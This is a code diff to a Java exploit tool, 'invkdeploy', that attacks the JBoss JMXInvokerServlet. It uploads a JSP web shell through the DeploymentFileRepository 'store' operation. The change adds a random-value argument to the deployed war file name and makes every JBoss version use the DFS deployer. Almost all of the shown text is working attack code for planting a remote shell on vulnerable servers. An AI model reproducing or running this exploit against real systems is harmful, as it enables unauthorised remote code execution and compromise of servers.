@@ -24,12 +24,9 @@ import javax.management.ObjectName;
 
     http://breenmachine.blogspot.com/2013/09/jboss-jmxinvokerservlet-exploit.html
 
- This file takes three arguments: [version] [remote url] and the third, which depends
- entirely on the version you're deploying to.  5.x should be the absolute path to the
- deploying JSP.  4.x and 3.x should be the local URL to deploying war.
+ This file takes four arguments: [version] [remote url] [jsp] [random value] 
 
- 5.x is broken and we cannot invoke the main deployer; instead, we invoke the DFS
- deployer and push up a JSP.
+ All versions use the DFS deployer for reliability reasons.
  */
 public class invkdeploy{
     private static Map<String, Integer> populateHashes(){
@@ -52,6 +49,7 @@ public class invkdeploy{
 
         String version;
         Integer hash;
+        Integer random_value;
         String remote_url;
         String local_url;
 
@@ -69,6 +67,7 @@ public class invkdeploy{
             version = (String)args[0]; 
             remote_url = args[1];
             local_url = args[2];
+            random_value = Integer.parseInt(args[3]);
 
             hash = version_hash.get(version);
             if(hash == null){
@@ -104,7 +103,8 @@ public class invkdeploy{
         file_list = new Object[]{
                 new javax.management.ObjectName("jboss.admin:service=DeploymentFileRepository"),
                 "store",
-                new Object[]{String.format("%s.war", jsps), jsps, ".jsp", jsp_shell, true},
+                new Object[]{String.format("%s%d.war", jsps, random_value), 
+                                            jsps, ".jsp", jsp_shell, true},
                 new String[]{"java.lang.String", "java.lang.String", "java.lang.String",
                              "java.lang.String", "boolean"}
         };
